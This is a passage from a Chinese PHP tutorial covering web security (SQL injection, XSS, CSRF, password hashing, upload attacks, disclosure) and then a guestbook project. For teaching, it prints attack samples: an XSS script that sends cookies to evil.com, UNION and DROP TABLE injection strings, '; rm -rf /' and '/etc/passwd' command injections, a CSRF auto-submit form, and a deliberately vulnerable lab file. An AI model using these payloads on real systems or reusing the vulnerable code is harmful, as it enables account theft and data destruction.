**1.** 预处理先把 SQL 的"骨架"（含占位符）发给数据库解析定稿，数据随后单独送达——数据只会被填充进占位符的位置，任何 `' OR 1=1 --` 都被当作字符串字面量，无法改变 SQL 结构。

**2.**

```sql
CREATE TABLE messages (
    id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    author VARCHAR(32) NOT NULL,
    content VARCHAR(500) NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
) CHARSET=utf8mb4;
INSERT INTO messages (author, content) VALUES ("张三", "第一条留言"), ("李四", "沙发");
```

**3.**

```php
$kw = trim($_GET["kw"] ?? "");
$stmt = $pdo->prepare("SELECT * FROM students WHERE name LIKE :kw");
$stmt->execute(["kw" => "%" . $kw . "%"]);
foreach ($stmt->fetchAll() as $r) {
    echo htmlspecialchars($r["name"]) . " " . $r["score"] . "<br>";
}
```

**5.** 不能有**任何输出**（header 是响应头，头必须先于体发出，输出了就 "headers already sent"）。exit 防止 PRG 重定向后继续执行下面的查询代码（省一次无谓查询，也避免重复输出）。

**[▲ 返回目录](#toc)**

---

<a id="h10"></a>

# 第 10 章 Web 安全专题

> 本章目标：四大 Web 漏洞（SQL 注入、XSS、CSRF、密码泄露）的攻击原理、亲手复现、防御方案。PHP 是被这些攻击"教育"最多的语言，防御体系也最成熟——学防御的最好方式是先看懂攻击。本章背景是防御方视角，属于合法学习范畴。

---

## 10.1 SQL 注入：最经典的漏洞

**原理**（第 9 章埋的雷）：把用户输入**拼接**进 SQL 字符串，用户输入里的 SQL 片段就会被执行：

```php
<?php
// 危险代码（教学演示，禁止上线！）
$q = $_GET["q"];
$rows = $pdo->query("SELECT * FROM users WHERE name = '$q'")->fetchAll();
```

攻击者在搜索框输入 `' OR 1=1 -- `，拼接后的 SQL 变成：

```sql
SELECT * FROM users WHERE name = '' OR 1=1 -- '
                             ↑ 恒真     ↑ 注释掉后面的引号
→ 返回全部用户（密码也在里面）
```

更狠的变体：`' UNION SELECT password FROM admin_users -- `（UNION 拼出别的表）、`'; DROP TABLE users; -- `（删库——多语句需特定配置，但 UNION 型最常见）。**注入曾常年霸榜 OWASP Top 10 榜首**。

**防御（唯一正解，第 9 章已练）**：预处理语句——数据与 SQL 结构分离，输入永远是数据：

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE name = :name");
$stmt->execute(["name" => $q]);        // 输入 ' OR 1=1 -- 只是一串要匹配的名字而已
```

辅助防御（纵深）：最小权限数据库账号（Web 应用绝不连 root）、错误信息不回显 SQL（防侦察）、ORM/查询构造器底层同样走预处理。**自查口诀：grep 项目里所有 `->query(`，带变量的全改 prepare。**

## 10.2 XSS：跨站脚本

**原理**：把用户输入**原样输出进 HTML**，输入里的 `<script>` 就成了别人的浏览器里执行的代码：

```php
<?php
// 危险：留言内容直接 echo（教学演示，禁止上线！）
echo "<p>" . $_POST["content"] . "</p>";
```

攻击者留言：

```html
<script>fetch("https://evil.com/steal?c=" + document.cookie)</script>
```

之后**每个看到这条留言的访问者**，浏览器都会执行这段脚本：把他们的 Cookie 发给攻击者——若 Cookie 没 httponly，登录态直接被偷（XSS 的典型变现）。变体：`<img onerror="...">`、假登录框钓密码、篡改页面。

**防御（输出转义）**：`htmlspecialchars` 把 `< > " '` 转成 HTML 实体，标签变纯文本：

```php
echo "<p>" . htmlspecialchars($content, ENT_QUOTES, "UTF-8") . "</p>";
// 输入 <script> → 输出 &lt;script&gt; —— 浏览器显示文字而不执行
```

写一个项目级的小助手（第 11 章项目全程使用）：

```php
function e(?string $s): string
{
    return htmlspecialchars((string)$s, ENT_QUOTES, "UTF-8");
}
// 模板里：<?= e($row["content"]) ?>
```

补充两层：富文本场景（允许用户发 `<b>`）用白名单过滤器（如 HTML Purifier）只保留安全标签；再配 **CSP 响应头**（Content-Security-Policy 限制脚本来源）兜底。**自查口诀：grep 所有 `echo $_` / `<?= $`，不在 e() 里的都是嫌疑犯。**

## 10.3 CSRF：借刀杀人

**原理**（第 7 章预备过）：攻击者不攻击你的服务器，而是**借受害者的浏览器**出手——受害者已登录你的站（Cookie 自动携带），被诱导访问恶意页面，页面里藏着对你站的请求：

```html
<!-- 恶意页面的内容（受害者毫不知情地"提交"） -->
<img src="https://bank-demo.local/transfer.php?to=attacker&amount=10000">
<form action="https://bank-demo.local/transfer.php" method="post">
    <input name="to" value="attacker"><input name="amount" value="10000">
</form><script>document.forms[0].submit();</script>
```

浏览器看到 bank-demo.local 的请求就带上该域的 Cookie——**服务器以为是受害者本人的操作**。写操作全中招（转账、改密码、删数据）。

**防御三件套**：

```php
// ① CSRF 令牌（第 7 章的完整机制）：恶意站拿不到受害者会话里的令牌
if (!hash_equals($_SESSION["csrf"] ?? "", $_POST["csrf"] ?? "")) {
    http_response_code(403);
    exit("CSRF 校验失败");
}

// ② SameSite Cookie（现代浏览器默认防线）：跨站请求不带 Cookie
setcookie(session_name(), session_id(), ["samesite" => "Lax", ...]);

// ③ 写操作一律 POST（+ 上述令牌），拒绝 GET 完成的写操作
```

Lax 模式下：外部站发起的跨站请求不带 Cookie（POST 天然被挡），顶级导航的 GET 才带——所以"GET 也能删除"（9.5 节的自我批评）在安全上是双料缺陷。**自查口诀：所有写操作 = POST + CSRF 令牌 + 权限校验。**

## 10.4 密码：存储与验证

**原理**：数据库泄露时，密码以什么形态存在决定灾难规模。明文（最糟）→ MD5（彩虹表秒破）→ **加盐慢哈希**（唯一正解）：

```php
// 注册：PHP 内置 bcrypt 哈希（自动生成随机盐，成本因子可调）
$hash = password_hash($_POST["password"], PASSWORD_DEFAULT);
// 形如 $2y$10$e0MYzXyjpJS7Pd0RVvHwHe1HlCS4bZJ18JuywdyEmMzkaRycw1FqS —— 直接存库
```

```php
// 登录：绝不能"哈希后比较字符串"（时序侧信道），用内置 verify
if (password_verify($_POST["password"], $row["password_hash"])) {
    // 登录成功
}
// 旧算法升级：verify 通过且需要重哈希时顺手升级
if (password_needs_rehash($row["password_hash"], PASSWORD_DEFAULT)) {
    ...重新 password_hash 并更新...
}
```

**(password_hash 自动处理盐、慢速抗暴力破解、PASSWORD_DEFAULT 会随 PHP 升级换更强算法)**。反面教材三连——以下写法全数淘汰：`md5($pwd)`、`md5($pwd . 固定盐)`、`sha1($pwd)`。登录比较同理要用恒定时间比较（hash_equals，第 7 章 CSRF 已用）——**对照第 2 章 `==` 的坑：敏感比较永远 hash_equals**。

配套习惯：登录失败信息统一"用户名或密码错误"（不泄露"哪个字段错了"）；加失败次数限制（防撞库爆破）；传输层 HTTPS（secure Cookie 的前提）。

### 漏洞补遗三连：开放重定向、SSRF、命令注入

三大件之外的三个高频洞，攻击思路与防御一并记住：

**① 开放重定向（Open Redirect）**：`header("Location: " . $_GET["url"])` 把用户跳到任意地址——攻击者构造 `login.php?redirect=https://evil.com/假登录页`，钓鱼可信度暴涨。防御：白名单或只允许站内相对路径：

```php
$to = $_GET["redirect"] ?? "/";
if (!str_starts_with($to, "/") || str_starts_with($to, "//")) {   // 挡 https://evil.com 与协议相对
    $to = "/";
}
header("Location: " . $to);
```

**② SSRF（服务端请求伪造）**：服务端代发请求的功能（"导入 URL 头像"）被攻击者指向内网 `http://169.254.169.254/`（云主机元数据接口，含临时凭证）。防御：URL 白名单域、解析后拒绝内网 IP 段、禁用重定向跟随、出口最小权限。

**③ 命令注入**：`shell_exec("ping " . $_GET["host"])` → payload `127.0.0.1; cat /etc/passwd`（分号拼接第二条命令）。防御铁律：**能用 PHP 原生函数绝不 shell**（检查主机存活有专门扩展/库）；必须执行时 `escapeshellarg()` 包裹每个参数并禁用结果回显。

### 上传漏洞全景：webshell 是怎么进去的

第 7 章"上传三查"的对手盘全景（知攻方能守）：

```
攻击路径 1：直接传.php → 防住（白名单 mime）
攻击路径 2：改扩展名 shell.jpg（内容是 PHP 代码）→ 若服务器把 .jpg 也交给 PHP 执行（配置失误）→ 中招
            防住：上传目录禁执行（Nginx: location /uploads/ 不配 fastcgi）
攻击路径 3：双扩展 shell.php.jpg → Apache 老配置从右往左解析失误 → 中招
            防住：随机改名（扩展名由我们定）
攻击路径 4：.htaccess 上传（Apache 允许目录配置时把 jpg 映射成 PHP）→ 中招
            防住：uploads 目录 AllowOverride None
攻击路径 5：文件内容里嵌 PHP 代码（图片注释区）→ 配合解析漏洞执行
            防住：重编码图片（重新生成缩略图）丢弃原字节
```

五条路径的共同终点都指向同一组防御：**内容验证 + 随机改名 + 禁执行 + 最小权限**。这份清单在真实审计中就是"上传功能检查表"——对照你的安全方向，第 10 章攻防同源的最后一课。

## 10.5 其他必修防线（清单式）

- **文件上传**：校验白名单扩展名 + `getimagesize` 验内容、重命名存储（不给原文件名）、**上传目录不给执行权限**——上传 webshell（一句话木马）是 PHP 史上最大漏洞家族；
- **include 漏洞**：`include $_GET["page"]` 动态包含 = 远程/任意文件包含（RCE），路径必须白名单；
- **命令注入**：`shell_exec("ping " . $_GET["host"])` → 注入 `; rm -rf /`；必须 escapeshellarg 或改用 PHP 原生函数；
- **错误信息**：生产 `display_errors=Off` + 日志入库——SQL 语句、路径泄露是攻击者的情报；
- **依赖漏洞**：`composer audit` 检查 vendor 里包的已知 CVE（同 Java 教程依赖治理思想）。

**纵深防御**总结成一张表：

| 层   | 措施                             | 防        |
| ---- | -------------------------------- | --------- |
| 输入 | 验证（形状）+ 类型强转           | 脏数据    |
| 存储 | 预处理语句                       | SQL 注入  |
| 输出 | htmlspecialchars 转义            | XSS       |
| 请求 | CSRF 令牌 + SameSite + POST      | CSRF      |
| 认证 | password_hash + 失败限速 + HTTPS | 爆破/窃听 |
| 权限 | 最小权限（DB 账号/文件系统）     | 灾难放大  |

### 安全响应头：一行配置一道墙

除了代码，**响应头**本身就是防线。五个必配头（Nginx 配置或 PHP header() 输出）：

| 头                                | 作用                                                         | 示例值               |
| --------------------------------- | ------------------------------------------------------------ | -------------------- |
| `X-Content-Type-Options: nosniff` | 禁止浏览器猜测文件类型（防上传图片被当脚本解析）             | nosniff              |
| `X-Frame-Options: DENY`           | 禁止被 iframe 嵌套（防点击劫持：透明页面叠在你站上骗点击）   | DENY / SAMEORIGIN    |
| `Content-Security-Policy`         | 限制页面能加载哪些来源的脚本/样式——**XSS 的最后防线**（就算注入了脚本标签，外部地址不加载） | `default-src 'self'` |
| `Strict-Transport-Security`       | 强制 HTTPS（HSTS：浏览器记住，下次自动跳）                   | `max-age=31536000`   |
| `Referrer-Policy: no-referrer`    | 出站请求不携带来源页 URL（防敏感参数泄露进外站日志）         | no-referrer          |

PHP 输出法（index.php 顶部或公共 include）：

```php
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("Referrer-Policy: no-referrer");
header("Content-Security-Policy: default-src 'self'");
```

自查方式：用 <https://securityheaders.com> 扫自己站点评分——A 级是及格线。安全头是"零代码成本"的防线：改几行配置就能挡掉一整类攻击，性价比全场最高。

### 安全开发流程：把第 10 章变成制度

个人项目靠自觉，团队项目靠**制度**——把安全嵌进开发流程：

1. **编码期**：模板统一走 e() 助手（团队规范禁裸 echo）；SQL 强制预处理（code review 一票否决裸 query）；新写函数签名带类型（strict_types）；
2. **提交期**：CI 跑三件套（phpstan + phpcs + PHPUnit）+ `composer audit`（依赖 CVE）——一条不过不合入；
3. **上线期**：securityheaders 扫描 + 跑一遍第 11 章自测清单 + 敏感配置核对（APP_DEBUG=false、.env 不进库、HTTPS）；
4. **运行期**：错误日志监控（异常激增 = 可能被扫）、定期备份演练（备份没恢复过等于没备份）、依赖升级节奏（月度 composer update + audit）。

**安全不是章节，是习惯**——四大漏洞的原理你已经懂了，这节是把"懂"变成"肌肉记忆与流程"。对你的安全方向而言：审计别人项目时的检查表，就是这四节的逆向使用。

## 10.6 动手实验：亲手注入一次（本地靶场）

**只在你自己的本地环境实验**。建靶文件：

```php
<?php
// vuln.php —— 本地漏洞靶场（勿上线）
$pdo = new PDO("mysql:host=127.0.0.1;dbname=demo;charset=utf8mb4", "root", "root",
    [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$q = $_GET["q"] ?? "";
$rows = $pdo->query("SELECT name, score FROM students WHERE name = '$q'")->fetchAll();
foreach ($rows as $r) echo htmlspecialchars($r["name"]) . " " . $r["score"] . "<br>";
```

实验三步（本地合法环境）：① 正常输入 `张三` → 返回一行；② 输入 `' OR 1=1 -- ` → 返回**全部**学生（注入成功！亲眼看到数据泄露）；③ 改成预处理版本再试同样的 payload → 返回零行（payload 变成了字面搜索词）。**见过攻击的样子，防御代码就不再是一行咒语**——这是本章的教学法。最后把 vuln.php 删掉或修好。

### 漏洞发现之后：负责任的披露流程

如果你（合法地，比如在授权测试/SRC 平台）发现了一个真实漏洞，接下来的流程比漏洞本身更考验专业度：

1. **确认影响范围**：漏洞能拿到什么数据？影响多少用户？能否被远程利用？——这份"影响评估"是报告的核心价值；
2. **不越界**：只做无害化验证（能证明漏洞存在即可，不下载用户数据、不横向移动、不留后门）——**未授权访问他人数据在任何司法辖区都是犯罪，无论动机多"正义"**；
3. **走官方渠道提交**：SRC 平台（各大厂的漏洞响应平台）、官方网站的 security.txt（RFC 9116：`/.well-known/security.txt` 声明的报告邮箱）、GitHub 的安全通告（Security Advisory，私有披露）；
4. **等修复再公开**：协调披露（coordinated disclosure）——给厂商 90 天左右的修复窗口，修完再公开细节；全程不炫耀、不卖漏洞给黑产；
5. **写一份像样的报告**：标题（一句话说清漏洞类型+位置）、复现步骤（curl 命令级别）、影响评估、修复建议——第 10 章每个小节的"原理+防御"结构就是报告模板。

白帽子与黑产的分界线只有一条：**授权与克制**。你的技术路线（防御视角 + 审计方法 + 负责任披露）从第 10 章到这里已经完整铺好，剩下的路是靶场里的练习时长。

## 10.7 小结

- SQL 注入：拼接 = 注入；唯一防御 = 预处理；自查 `->query(` 带变量的；
- XSS：原样输出 = 注入脚本；防御 = htmlspecialchars（封装成 e()）；富文本白名单 + CSP；
- CSRF：借受害者浏览器出手；防御 = 令牌 + SameSite + 写操作 POST；
- 密码：password_hash/verify（自动盐+慢哈希），比较用 hash_equals；
- 纵深防御清单化：输入验证、最小权限、错误不外泄、上传不执行、composer audit。

## 练习 10

1.（概念）解释 `?q=' OR 1=1 -- ` 在拼接式 SQL 里的作用原理，并说明预处理为什么能挡住它。
2.（编程）给 9.5 的 manage.php 加"管理权限"：非 `$_SESSION["role"] === "admin"` 访问删除操作时 403（结合第 8 章 guard）。
3.（改错）找出下面代码的三个安全问题：

```php
$kw = $_GET["kw"];
$sql = "SELECT * FROM messages WHERE content LIKE '%$kw%'";
$rows = $pdo->query($sql)->fetchAll();
echo "搜索：$kw<br>";
foreach ($rows as $r) echo $r["content"] . "<br>";
```

**4.**（编程）写 `strong_password(string $pwd): bool`：长度 ≥ 8、含大小写与数字（用正则）。
**5.**（概念）为什么"用户改名时把旧留言的 author 同步 UPDATE"不算 XSS 防御？XSS 的正确防御时机在哪一步？

## 参考答案

**1.** 拼接后 SQL 变为 `WHERE name = '' OR 1=1 -- ''`：引号提前闭合 + 恒真条件 + 注释收尾，全表泄露。预处理下 SQL 骨架先行解析定稿，payload 全部进入数据通道成为待匹配的字面字符串，查不到自然返回空。

**2.** 删除分支前加：

```php
if (($_SESSION["role"] ?? "") !== "admin") {
    http_response_code(403);
    exit("需要管理员权限");
}
```

**3.** ① LIKE 关键字拼接 → 注入（改预处理 + 参数 `"%$kw%"`）；② `echo "搜索：$kw"` 未转义 → 反射型 XSS（包 e()/htmlspecialchars）；③ 查询结果 `$r["content"]` 未转义 → 存储型 XSS；加一分：无 keyword 空值处理、无分页上限。

**4.**

```php
function strong_password(string $pwd): bool
{
    return (bool)preg_match('/^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$/', $pwd);
}
```

**5.** 逐条刷库"消毒"旧数据治标不治本（新数据、漏网数据永远存在）。XSS 的正确防御时机是**输出时转义**（e()）——存储保持原文、渲染处统一转义才是体系解。

**[▲ 返回目录](#toc)**

---

<a id="h11"></a>

# 第 11 章 项目实战：留言板

> 本章目标：把全书知识组装成一个完整网站——带注册登录、CSRF 防护、PDO 持久化、转义输出的留言板。先单文件快速成型，再拆成 MVC-lite 结构，最后附自测清单。**这是 PHP 卷的毕业设计。**

---

## 11.1 需求与设计

**功能**：① 注册（用户名+密码哈希）；② 登录/登出（Session）；③ 发表留言（登录后，带 CSRF 令牌）；④ 留言列表（倒序、转义输出）；⑤ 删除自己的留言（权限校验）。

**数据模型**（两张表，第 9 章 SQL）：

```sql
CREATE TABLE users (
    id            INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    username      VARCHAR(32) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    created_at    DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
) CHARSET=utf8mb4;

CREATE TABLE messages (
    id         INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    user_id    INT UNSIGNED NOT NULL,
    content    VARCHAR(500) NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    CONSTRAINT fk_msg_user FOREIGN KEY (user_id) REFERENCES users(id)
) CHARSET=utf8mb4;
```

**页面清单**：`register.php` / `login.php` / `logout.php` / `index.php`（留言列表+发表表单）/ `delete.php`。共享代码抽成 `app.php`（连接、辅助函数、会话启动）。

## 11.2 公共底座：app.php

```php
<?php
// app.php —— 全站共享：连接 + 帮手 + 会话
declare(strict_types=1);

session_start();

$pdo = new PDO(
    "mysql:host=127.0.0.1;dbname=demo;charset=utf8mb4",
    "root",
    "root",
    [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::ATTR_EMULATE_PREPARES   => false,
    ]
);

function e(?string $s): string                                   // XSS 转义（第 10 章）
{
    return htmlspecialchars((string)$s, ENT_QUOTES, "UTF-8");
}

function csrf_token(): string                                    // CSRF 令牌（一次生成全站用）
{
    if (empty($_SESSION["csrf"])) {
        $_SESSION["csrf"] = bin2hex(random_bytes(16));
    }
    return $_SESSION["csrf"];
}

function check_csrf(): void
{
    if (!hash_equals($_SESSION["csrf"] ?? "", $_POST["csrf"] ?? "")) {
        http_response_code(403);
        exit("非法请求");
    }
}

function current_user(): ?array                                  // 当前登录用户（null=未登录）
{
    global $pdo;
    static $cached = false, $user = null;                        // 一页内只查一次
    if (!$cached) {
        $cached = true;
        $uid = $_SESSION["user_id"] ?? null;
        if ($uid !== null) {
            $stmt = $pdo->prepare("SELECT id, username FROM users WHERE id = :id");
            $stmt->execute(["id" => $uid]);
            $user = $stmt->fetch() ?: null;                      // 会话残留但用户被删时自动降级
        }
    }
    return $user;
}

function require_login(): array                                  // 守卫（第 8 章）
{
    $u = current_user();
    if ($u === null) {
        header("Location: login.php");
        exit;
    }
    return $u;
}
```

`static` 局部变量：函数内跨调用记忆（本章新知识点）——current_user 一页可能被模板调多次，缓存查询结果。

## 11.3 注册与登录

```php
<?php
// register.php
require "app.php";

$errors = [];
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    check_csrf();                                                // 先验来源
    $username = trim($_POST["username"] ?? "");
    $password = $_POST["password"] ?? "";

    if (!preg_match('/^[\w\x{4e00}-\x{9fff}]{2,20}$/u', $username)) {
        $errors[] = "用户名 2~20 位（中文/字母/数字/下划线）";
    }
    if (strlen($password) < 8) {
        $errors[] = "密码至少 8 位";
    }
    if (!$errors) {
        $exists = $GLOBALS["pdo"]->prepare("SELECT id FROM users WHERE username = :u");
        $exists->execute(["u" => $username]);
        if ($exists->fetch()) {
            $errors[] = "用户名已被占用";
        } else {
            $GLOBALS["pdo"]->prepare(
                "INSERT INTO users (username, password_hash) VALUES (:u, :p)"
            )->execute(["u" => $username, "p" => password_hash($password, PASSWORD_DEFAULT)]);
            header("Location: login.php?registered=1");          // PRG
            exit;
        }
    }
}
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>注册</title></head><body>
<h1>注册</h1>
<?php foreach ($errors as $err): ?><p style="color:red"><?= e($err) ?></p><?php endforeach; ?>
<form method="post">
    <input type="hidden" name="csrf" value="<?= e(csrf_token()) ?>">
    <p>用户名：<input name="username" required></p>
    <p>密码：<input type="password" name="password" required></p>
    <button>注册</button>
</form>
<p><a href="login.php">已有账号？去登录</a></p>
</body></html>
```

login.php 同款骨架（把 INSERT 换成 SELECT + `password_verify`，成功后 `session_regenerate_id(true)` + `$_SESSION["user_id"] = $row["id"]` + PRG 跳 index.php）——第 8 章代码的数据库升级版，练习 3 要求你补全。

## 11.4 主页面：留言列表 + 发表

```php
<?php
// index.php —— 首页：列表 + 登录状态 + 发表表单
require "app.php";
$user = current_user();                          // 不强制登录：游客可看，发言需登录

if ($_SERVER["REQUEST_METHOD"] === "POST") {     // 发表留言
    $user = require_login();                     // 双保险
    check_csrf();
    $content = trim($_POST["content"] ?? "");
    if (mb_strlen($content) < 1 || mb_strlen($content) > 500) {
        $errors = ["留言需 1~500 字"];
    } else {
        $GLOBALS["pdo"]->prepare(
            "INSERT INTO messages (user_id, content) VALUES (:uid, :c)"
        )->execute(["uid" => $user["id"], "c" => $content]);
        header("Location: index.php");           // PRG
        exit;
    }
}

$rows = $GLOBALS["pdo"]->query(
    "SELECT m.id, m.content, m.created_at, m.user_id, u.username
     FROM messages m JOIN users u ON u.id = m.user_id
     ORDER BY m.id DESC LIMIT 50"
)->fetchAll();
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>留言板</title></head><body>
<h1>留言板</h1>

<?php if ($user === null): ?>
    <p><a href="login.php">登录</a> 或 <a href="register.php">注册</a> 后发表留言</p>
<?php else: ?>
    <p>你好，<?= e($user["username"]) ?>　<a href="logout.php">登出</a></p>
    <form method="post">
        <input type="hidden" name="csrf" value="<?= e(csrf_token()) ?>">
        <textarea name="content" rows="3" cols="50" maxlength="500" required></textarea><br>
        <button>发表留言</button>
    </form>
<?php endif; ?>

<hr>
<?php foreach ($rows as $r): ?>
    <p>
        <strong><?= e($r["username"]) ?></strong>
        <small><?= e($r["created_at"]) ?></small><br>
        <?= nl2br(e($r["content"])) ?>                       <!-- 换行转 <br>，内容转义 -->
        <?php if ($user !== null && $user["id"] === (int)$r["user_id"]): ?>
            　<a href="delete.php?id=<?= (int)$r["id"] ?>"
                onclick="return confirm('删除这条留言？')">删除</a>
        <?php endif; ?>
    </p>
    <hr>
<?php endforeach; ?>
</body></html>
```

**权限点**：删除链接只渲染给"留言作者本人"（前端隐藏）——**且 delete.php 服务端还要再查一次**（前端隐藏可绕过，服务端校验才是防线，第 10 章原则）。`nl2br(e(...))` 顺序：先转义再换行转换。

## 11.5 删除：服务端二次校验

```php
<?php
// delete.php —— 服务端权限校验（前端隐藏不算数！）
require "app.php";
$user = require_login();

$id = (int)($_GET["id"] ?? 0);                  // 强转：非数字直接变 0（查不到）
$stmt = $GLOBALS["pdo"]->prepare("SELECT user_id FROM messages WHERE id = :id");
$stmt->execute(["id" => $id]);
$owner = $stmt->fetchColumn();                  // 拿到作者 id（false=不存在）

if ($owner === false) {
    http_response_code(404);
    exit("留言不存在");
}
if ((int)$owner !== $user["id"]) {              // 不是自己的留言
    http_response_code(403);
    exit("只能删除自己的留言");
}

$GLOBALS["pdo"]->prepare("DELETE FROM messages WHERE id = :id")->execute(["id" => $id]);
header("Location: index.php");
exit;
```

这是**IDOR（不安全直接对象引用）**的标准防御：**先查归属再动手**——攻击者改 URL 里的 id 也只拿到 403。对照 FastAPI/Java 教程的"先查再改"模式，同一思想。

### 分页与 .env 配置拆分

留言多了要分页（第 9 章 LIMIT/OFFSET 的落地）：

```php
<?php
// index.php 数据查询段
$perPage = 10;
$page = max(1, (int)($_GET["page"] ?? 1));
$offset = ($page - 1) * $perPage;

$stmt = $GLOBALS["pdo"]->prepare(
    "SELECT m.id, m.content, m.created_at, m.user_id, u.username
     FROM messages m JOIN users u ON u.id = m.user_id
     ORDER BY m.id DESC LIMIT :limit OFFSET :offset"
);
$stmt->bindValue(":limit", $perPage, PDO::PARAM_INT);       // LIMIT 占位符必须显式绑 int
$stmt->bindValue(":offset", $offset, PDO::PARAM_INT);       // （否则当字符串处理，部分配置报错）
$stmt->execute();
$rows = $stmt->fetchAll();

$total = (int)$GLOBALS["pdo"]->query("SELECT COUNT(*) FROM messages")->fetchColumn();
$totalPages = max(1, (int)ceil($total / $perPage));
```

```php
<!-- 分页导航 -->
<p>
<?php for ($p = 1; $p <= $totalPages; $p++): ?>
    <?php if ($p === $page): ?>
        <strong><?= $p ?></strong>
    <?php else: ?>
        <a href="?page=<?= $p ?>"><?= $p ?></a>
    <?php endif; ?>
<?php endfor; ?>
（共 <?= $totalPages ?> 页 / <?= $total ?> 条）
</p>
```

**配置拆分**——把数据库密码从代码挪进 `.env`（第 6 章 vlucas/phpdotenv 的落地）：

```ini
# .env（进 .gitignore，绝不提交！）
DB_DSN="mysql:host=127.0.0.1;dbname=demo;charset=utf8mb4"
DB_USER=root
DB_PASS=root
APP_DEBUG=true
```

```php
// app.php 顶部
require __DIR__ . "/vendor/autoload.php";
$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->safeLoad();                        // .env 不存在也不报错（测试环境友好）

$pdo = new PDO($_ENV["DB_DSN"], $_ENV["DB_USER"], $_ENV["DB_PASS"], [...]);
```

配置与代码分离的两层收益：**安全**（密码不进 Git 历史——泄露过的密码等于没改）与**环境切换**（开发/生产各一份 .env，代码零改动）。第 12 章 Laravel 的 .env 机制与此完全一致。

## 11.6 升级：拆成 MVC-lite 结构（第 6 章落地）

单文件教学版完成后，按第 6 章结构重构（留言板的工程化形态）：

```
guestbook/
├── composer.json        （autoload: "App\\": "src/"）
├── public/
│   └── index.php        ← 前端控制器：autoload + 简易路由
├── src/
│   ├── Db.php           （PDO 单例工厂）
│   ├── Auth.php         （register/login/logout/currentUser）
│   ├── MessageRepo.php  （数据访问：all/insert/deleteWithOwnerCheck）
│   └── Controllers/     （AuthController / MessageController）
├── views/
│   ├── layout.php       （公共页头页尾：<?= $content ?> 插槽）
│   ├── login.php / register.php
│   └── index.php        （列表视图，数据由控制器传入）
└── .env                 （DB_DSN / DB_USER / DB_PASS —— gitignore！）
```

简化路由（index.php）示范"单入口"思想：

```php
<?php
require __DIR__ . "/../vendor/autoload.php";

$path = parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH);
$route = match ($path) {
    "/", "/index.php" => "index",
    "/login"          => "login",
    "/register"       => "register",
    "/logout"         => "logout",
    default           => "404",
};

$view = match ($route) {
    "index"   => (new App\Controllers\MessageController())->index(),
    "login"   => (new App\Controllers\AuthController())->login(),
    ...
};

require __DIR__ . "/../views/layout.php";     // layout 里 echo $view
```

**MVC-lite 的收益清单**：模型可测试（不依赖 HTTP）、视图零逻辑、控制器薄；换数据库动 store、换样式动 views、改规则动 controller——**三线互不干扰**。这个结构练习手写一遍，再看 Laravel（第 12 章）就是"认识放大版"。

### 体验升级：时间显示与"X 分钟前"

留言时间戳的友好化显示（`date()` 直出 2026-11-17 10:30:00 太工程化，人类爱看"3 分钟前"）：

```php
<?php
// app.php 里加一个帮手
function time_ago(string $datetime): string
{
    $ago = time() - strtotime($datetime);          // 距今秒数
    return match (true) {
        $ago < 60        => "刚刚",
        $ago < 3600      => floor($ago / 60) . " 分钟前",
        $ago < 86400     => floor($ago / 3600) . " 小时前",
        $ago < 86400 * 7 => floor($ago / 86400) . " 天前",
        default          => date("Y-m-d", strtotime($datetime)),   // 一周外退回日期
    };
}
// 模板：<small><?= e(time_ago($r["created_at"])) ?></small>
```

`match(true)` + 多条件阶梯（对照第 3 章）一行一个区间；`strtotime` 把数据库时间字符串转 Unix 时间戳做减法。顺带一个**时区大坑**：PHP 与 MySQL 的时区要一致（`date_default_timezone_set("Asia/Shanghai")` 或 php.ini `date.timezone`），否则时间差 8 小时——数据库默认 UTC、PHP 默认 UTC（PHP 7+），显式设置是唯一免祸做法。

### 前后端小进化：头像与字符统计

两个小功能展示"现有知识 + 一点点新料"= 立刻可用的增值：

**① 无头像服务的默认头像**（首字母 + 颜色哈希，零依赖）：

```php
<?php
function avatar_html(string $username): string
{
    $colors = ["#e74c3c", "#3498db", "#2ecc71", "#9b59b6", "#f39c12"];
    $color = $colors[crc32($username) % count($colors)];       // 哈希取色：同名恒同色
    $initial = mb_strtoupper(mb_substr($username, 0, 1));
    return '<span class="avatar" style="background:' . $color . '">' . e($initial) . "</span>";
}
// CSS: .avatar { display:inline-block; width:32px; height:32px; border-radius:50%;
//        color:#fff; text-align:center; line-height:32px; }
```

**② 输入时字数统计**（HTML5 + 一行 JS，不用框架）：

```html
<textarea name="content" id="c" maxlength="500" rows="3"></textarea>
<span id="cnt">0/500</span>
<script>
document.getElementById("c").addEventListener("input", function () {
    document.getElementById("cnt").textContent = this.value.length + "/500";
});
</script>
```

两个小件都只用了**已学知识**（哈希取模、mb_ 系列、内联事件）——所谓"会写网站"不是会多少框架，而是**把基础件组合成体验**的能力。这类 20 分钟的小功能攒起来，就是你的作品集。

### 图形验证码：GD 库画一张

登录/发言防机器人最朴素的手段——PHP 内置 GD 图形库生成验证码图片：

```php
<?php
// captcha.php —— 生成 4 位验证码图片
session_start();
$code = "";
for ($i = 0; $i < 4; $i++) {
    $code .= random_int(0, 9);                   // 简化版纯数字；可加字母去歧义(去0O1lI)
}
$_SESSION["captcha"] = $code;                    // 答案存服务端会话

$img = imagecreatetruecolor(100, 34);            // 画布
$bg = imagecolorallocate($img, 245, 245, 245);
$fg = imagecolorallocate($img, 40, 40, 40);
imagefilledrectangle($img, 0, 0, 100, 34, $bg);

for ($i = 0; $i < 4; $i++) {                     // 逐字符画（随机位置/微旋转感用随机 y）
